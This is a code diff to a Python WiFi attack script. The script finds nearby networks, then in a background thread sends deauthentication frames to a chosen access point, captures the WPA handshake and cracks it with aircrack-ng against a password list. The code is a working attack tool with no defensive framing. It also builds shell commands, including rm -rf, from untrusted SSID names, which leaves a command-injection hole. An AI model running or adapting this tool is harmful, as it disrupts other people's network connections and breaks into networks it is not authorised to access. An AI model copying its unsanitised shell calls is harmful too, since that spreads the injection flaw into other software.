@@ -3,6 +3,7 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
 from scapy.layers.eap import EAPOL
 import threading,random,time,os,subprocess,sys,re,shutil
 
+target_ap=None
 target_ssid=None
 data_networks={}
 data_ch={}
@@ -10,6 +11,11 @@ data_bssid={}
 networks={}
 n=0
 stop_hopper = threading.Event()
+
+def deauth_attack():
+      global target_ap
+      deauth=subprocess.Popen(['aireplay-ng','--deauth','5','-a',target_ap,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+      stdout,stderr=deauth.communicate()
 
 def check_tools():
       print("\n[+] check tools and librery\n")
@@ -52,7 +58,7 @@ def check_tools():
 
 def crack_handshake():
         global target_ssid
-        print("[+] start cracking")
+        print("[+] start cracking please wait ......")
         c=subprocess.Popen(['aircrack-ng','-w','passwordlist.txt',f'{target_ssid}-01.cap'],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL, text=True)
         stdout,_=c.communicate()
         match=re.search(r'KEY FOUND!\s*\[\s*([^\s\]]+)',stdout)
@@ -65,20 +71,20 @@ def crack_handshake():
              os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")      
 
 def handshake_check():
-        global target_ssid
+        global target_ssid ,target_ap
         stop_hopper.set()   
         time.sleep(1) 
         NUM=int(input("[+] N: "))
-        print("[+] starting check handshake please waite ..........")
+        print("[+] starting check handshake please waite 50 secands ..........")
         target_ap=data_bssid[NUM]
         target_ch=data_ch[NUM]
         target_ssid=data_networks[target_ap]
         os.system(f"iw dev wlan0mon set channel {target_ch}")
-        deauth=subprocess.Popen(['aireplay-ng','--deauth','5','-a',target_ap,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        stdout,stderr=deauth.communicate()
+        threading.Thread(target=deauth_attack, daemon=True).start()
+        
         h=subprocess.Popen(['airodump-ng','-c',str(target_ch),'--bssid',target_ap,'-w',target_ssid,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE ,text=True)
         try:
-             stdout, stderr = h.communicate(timeout=30)
+             stdout, stderr = h.communicate(timeout=50)
         except subprocess.TimeoutExpired:
                 h.terminate()
         
